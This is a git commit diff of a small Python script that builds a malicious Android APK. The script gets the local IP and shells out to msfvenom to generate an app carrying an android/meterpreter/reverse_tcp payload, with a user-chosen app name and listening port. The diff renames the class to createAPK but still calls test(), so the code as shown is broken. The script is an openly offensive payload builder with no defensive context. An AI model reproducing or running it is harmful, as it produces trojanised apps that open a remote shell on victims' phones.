81d0d9f8dc3b6061c95b9cc357fa4ac30bd9e93b
Grester43hck <grester43hck@gmail.com>
2016-08-14 11:55:09 +0200

    try

--- Python-1.py
+++ Python-1.py
@@ -2,36 +2,35 @@ import socket
 import argparse
 from subprocess import Popen, PIPE, STDOUT
 
-class test:
-    def get_ip_address(a):
+class createAPK:
+    def get_ip_address(self):
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
         return s.getsockname()[0]
     
-    def launchProcess(a,command):
+    def launchProcess(self,command):
         p = Popen(command, stdout = PIPE, 
             stderr = STDOUT, shell = True)
         for line in p.stdout:
             print line.replace('\n', '')
         return 0
     
-    def run(self):
-        parser = argparse.ArgumentParser(description='Testing')
-        #parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
-                            #help='ip remota')
-        parser.add_argument('app_name', metavar='name', type=str, nargs='+',
-                            help='nombre de la app')
-        parser.add_argument('lp', metavar='lp', type=str, nargs='+',
-                            help='local port')
-        args = parser.parse_args()
-        
-        print args.lp
+    def run(self, app_name, lp):
         
         ipl = self.get_ip_address()
         print ipl
-        com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+args.lp[0]+" R >"+args.app_name[0]+".apk"
+        com = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ipl+" LPORT="+lp[0]+" R >"+app_name[0]+".apk"
         
         self.launchProcess(com)
         
+parser = argparse.ArgumentParser(description='Testing')
+        #parser.add_argument('ip_remota', metavar='ipr', type=str, nargs='+',
+                            #help='ip remota')
+parser.add_argument('app_name', metavar='name', type=str, nargs='+',
+                    help='nombre de la app')
+parser.add_argument('lp', metavar='lp', type=str, nargs='+',
+                    help='local port')
+args = parser.parse_args()
+        
 T = test()
-T.run()
+T.run(args.app_name, args.lp)
